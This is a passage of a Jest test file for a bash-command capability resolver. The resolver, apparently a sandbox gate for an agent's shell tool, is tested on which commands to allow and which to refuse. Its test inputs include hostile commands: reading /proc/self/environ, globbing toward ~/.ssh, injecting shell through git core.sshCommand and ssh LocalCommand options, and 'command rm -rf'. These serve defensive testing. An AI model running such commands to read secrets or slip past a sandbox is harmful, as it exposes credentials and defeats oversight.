    expect(r.kind).toBe('refuse');
    if (r.kind === 'refuse') expect(r.reason).toContain('shell glob');
  });

  test('glob `~/.s*` DOES refuse (tilde-rooted protected reach)', () => {
    const r = resolveCapabilities('bash', { command: 'cat ~/.s*' }, CTX);
    expect(r.kind).toBe('refuse');
  });
});

describe('bash resolver — ssh edge cases (slices 125 + 127)', () => {
  test('ssh -p 2222 server → target is `server`, not `2222` (slice 125)', () => {
    const r = resolveCapabilities('bash', { command: 'ssh -p 2222 server.example.com' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities);
      expect(s).toContain('net-egress:server.example.com');
    }
  });

  test('ssh -L 8080:localhost:80 user@host → port forwarding adds net-ingress (slice 125)', () => {
    const r = resolveCapabilities('bash', { command: 'ssh -L 8080:localhost:80 user@host' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities);
      expect(s).toContain('net-egress:host');
      expect(s).toContain('net-ingress:*');
    }
  });

  test('ssh -w any host → `any` consumed as tun-device, target is `host` (R3 P0-3)', () => {
    const r = resolveCapabilities('bash', { command: 'ssh -w any user@host.example' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities);
      // Pre-R3, `any` was picked as target → net-egress:any.
      expect(s).toContain('net-egress:host.example');
      expect(s).not.toContain('net-egress:any');
    }
  });

  test('ssh -w 0:1 user@host → colon-shape consumed (slice 125 P1)', () => {
    const r = resolveCapabilities('bash', { command: 'ssh -w 0:1 user@host.example' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities);
      expect(s).toContain('net-egress:host.example');
      expect(s).not.toContain('net-egress:0:1');
    }
  });

  test('ssh -o LocalCommand=evil refuses (slice 125 P1)', () => {
    const r = resolveCapabilities('bash', { command: 'ssh -o LocalCommand=evil host' }, CTX);
    expect(r.kind).toBe('refuse');
    if (r.kind === 'refuse') expect(r.reason).toContain('LocalCommand');
  });

  test('ssh -o KnownHostsCommand=evil refuses (slice 125 P1)', () => {
    const r = resolveCapabilities('bash', { command: 'ssh -o KnownHostsCommand=evil host' }, CTX);
    expect(r.kind).toBe('refuse');
    if (r.kind === 'refuse') expect(r.reason).toContain('KnownHostsCommand');
  });
});

describe('bash resolver — cargo edge cases (slice 125 P1)', () => {
  test('cargo clean emits delete-fs(target), no exec:arbitrary', () => {
    const r = resolveCapabilities('bash', { command: 'cargo clean' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities);
      expect(s).toContain('delete-fs:/work/proj/target');
      expect(s.some((c) => c.startsWith('exec:arbitrary'))).toBe(false);
    }
  });

  test('cargo build --target-dir=<path> redirects build output write-fs', () => {
    const r = resolveCapabilities(
      'bash',
      { command: 'cargo build --target-dir=/tmp/other-target' },
      CTX,
    );
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities);
      expect(s).toContain('write-fs:/tmp/other-target');
      expect(s).not.toContain('write-fs:/work/proj/target');
    }
  });
});

describe('bash resolver — mv/cp -t target-directory (slice 125 P1)', () => {
  test('mv -t /dst src1 src2 → dst is targetDir, srcs are reads', () => {
    const r = resolveCapabilities('bash', { command: 'mv -t /dst src1 src2' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('write-fs:/dst');
      expect(s).toContain('read-fs:/work/proj/src1');
      expect(s).toContain('read-fs:/work/proj/src2');
    }
  });

  test('mv --target-directory=/dst src1 → same shape', () => {
    const r = resolveCapabilities('bash', { command: 'mv --target-directory=/dst src1' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('write-fs:/dst');
      expect(s).toContain('read-fs:/work/proj/src1');
    }
  });

  test('cp -t /dst src → write-fs(dst) + read-fs(src)', () => {
    const r = resolveCapabilities('bash', { command: 'cp -t /dst src' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('write-fs:/dst');
      expect(s).toContain('read-fs:/work/proj/src');
    }
  });
});

// Slice 128 (R4) — security review #4 fixes.
describe('bash resolver — slice 128 R4 P0 fixes', () => {
  test('R4 P0-Launder-1: `command rm -rf` is hard-refused', () => {
    const r = resolveCapabilities('bash', { command: 'command rm -rf /tmp/x' }, CTX);
    expect(r.kind).toBe('refuse');
  });

  test('R4 P0-Launder-1: `builtin echo hi` is hard-refused', () => {
    const r = resolveCapabilities('bash', { command: 'builtin echo hi' }, CTX);
    expect(r.kind).toBe('refuse');
  });

  test('R4 P0-Launder-2: `git -c core.sshCommand=...` refused', () => {
    const r = resolveCapabilities(
      'bash',
      { command: "git -c core.sshCommand='sh -c id' clone https://x/y" },
      CTX,
    );
    expect(r.kind).toBe('refuse');
    if (r.kind === 'refuse') expect(r.reason).toContain('-c');
  });

  test('R4 P0-Launder-2: `git --exec-path=/tmp/evil` refused', () => {
    const r = resolveCapabilities('bash', { command: 'git --exec-path=/tmp/evil log' }, CTX);
    expect(r.kind).toBe('refuse');
  });

  test('R4 P0-Launder-3: `cat < /proc/self/environ` refused (input redirect classifier)', () => {
    const r = resolveCapabilities('bash', { command: 'cat < /proc/self/environ' }, CTX);
    expect(r.kind).toBe('refuse');
    if (r.kind === 'refuse') expect(r.reason).toContain('input redirect');
  });

  test('R4 P0-Launder-3: input redirect from safe path emits read-fs', () => {
    const r = resolveCapabilities('bash', { command: 'cat < /work/proj/data.txt' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities);
      expect(s).toContain('read-fs:/work/proj/data.txt');
    }
  });

  test('R4 P0-Launder-4: `find -execdir` emits exec:arbitrary (was -exec-only)', () => {
    const r = resolveCapabilities('bash', { command: 'find /tmp -execdir bash {} \\;' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities);
      expect(s).toContain('exec:arbitrary');
    }
  });

  test('R4 P0-Launder-4: `find -ok` emits exec:arbitrary', () => {
    const r = resolveCapabilities('bash', { command: 'find /tmp -ok bash {} \\;' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities);
      expect(s).toContain('exec:arbitrary');
    }
  });
});

describe('bash resolver — slice 128 R4 P1 fixes', () => {
  test('R4 P1-Launder: curl --upload-file=<path> attributes read-fs', () => {
    const r = resolveCapabilities(
      'bash',
      { command: 'curl --upload-file=/work/proj/data.bin https://example.com' },
      CTX,
    );
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities);
      expect(s).toContain('read-fs:/work/proj/data.bin');
    }
  });

  test('R4 P1-Launder: curl --cookie-jar=<path> attributes write-fs', () => {
    const r = resolveCapabilities(
      'bash',
      { command: 'curl --cookie-jar=/tmp/jar.txt https://example.com' },
      CTX,
    );
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities);
      expect(s).toContain('write-fs:/tmp/jar.txt');
    }
  });

  test('R4 P1-Launder: node --eval refused (long form of -e)', () => {
    const r = resolveCapabilities('bash', { command: 'node --eval' }, CTX);
    expect(r.kind).toBe('refuse');
    if (r.kind === 'refuse') expect(r.reason).toContain('inline code');
  });

  test('R4 P1-Launder: node --inspect=0.0.0.0:9229 emits net-ingress', () => {
    const r = resolveCapabilities(
      'bash',
      { command: 'node --inspect=0.0.0.0:9229 script.js' },
      CTX,
    );
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities);
      expect(s).toContain('net-ingress:*');
    }
  });
});

// Slice 129 (R5) — security review #5 fixes.
describe('bash resolver — slice 129 R5 P0 fixes', () => {
  test('R5 P0-2: `git --git-dir=/tmp/evil ...` refused', () => {
    const r = resolveCapabilities('bash', { command: 'git --git-dir=/tmp/evil log' }, CTX);
    expect(r.kind).toBe('refuse');
    if (r.kind === 'refuse') expect(r.reason).toContain('--git-dir');
  });

  test('R5 P0-2: `git --git-dir /tmp/evil ...` (space-separated) refused', () => {
    const r = resolveCapabilities('bash', { command: 'git --git-dir /tmp/evil log' }, CTX);
    expect(r.kind).toBe('refuse');
    if (r.kind === 'refuse') expect(r.reason).toContain('--git-dir');
  });

  test('R5 P0-2: `git --work-tree=/tmp/evil ...` refused', () => {
    const r = resolveCapabilities('bash', { command: 'git --work-tree=/tmp/evil status' }, CTX);
    expect(r.kind).toBe('refuse');
    if (r.kind === 'refuse') expect(r.reason).toContain('--work-tree');
  });
});
